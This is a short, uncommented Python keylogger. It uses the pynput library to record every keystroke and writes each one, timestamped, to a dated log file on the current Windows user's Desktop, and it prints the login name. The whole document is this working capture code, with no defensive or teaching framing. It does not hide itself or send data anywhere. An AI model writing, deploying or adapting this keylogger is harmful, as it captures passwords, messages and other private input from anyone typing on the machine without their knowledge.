import os
import shutil
import logging
from pynput.keyboard import Listener as KeyListener
from datetime import datetime

username = os.getlogin()
today = datetime.today().strftime('%Y-%m-%d')
print(username)
logs_dir = f"C:/Users/{username}/Desktop"
logging.basicConfig(filename=f"{logs_dir}/{today}.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with KeyListener(on_press=key_handler) as listener:
    listener.join()